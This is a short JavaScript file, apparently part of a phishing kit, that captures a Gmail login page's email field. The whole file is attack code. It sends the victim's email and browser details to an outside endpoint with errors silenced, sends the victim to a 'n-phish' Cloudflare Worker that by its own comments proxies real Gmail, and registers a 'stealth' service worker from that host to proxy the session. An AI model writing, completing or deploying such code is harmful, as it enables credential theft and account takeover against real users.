// capture.js - Route to YOUR Cloudflare Worker
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('loginForm');
    const emailInput = document.getElementById('identifier');
    
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const email = emailInput.value;
        const victimData = {
            email: email,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform
        };
        
        // 1. EXFIL EMAIL IMMEDIATELY
        fetch('https://httpbin.org/post', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(victimData)
        }).catch(() => {}); // Silent fail
        
        // 2. REDIRECT TO YOUR WORKER (proxies real Gmail)
        window.location.href = `https://n-phish.ia7353038.workers.dev/mail/u/0/#inbox?email=${encodeURIComponent(email)}`;
    });
    
    // Stealth Service Worker for all Google traffic
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('https://n-phish.ia7353038.workers.dev/sw.js')
            .catch(() => {}); // Silent
    }
});

// Service Worker registration for full session proxying
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/sw.js');
}
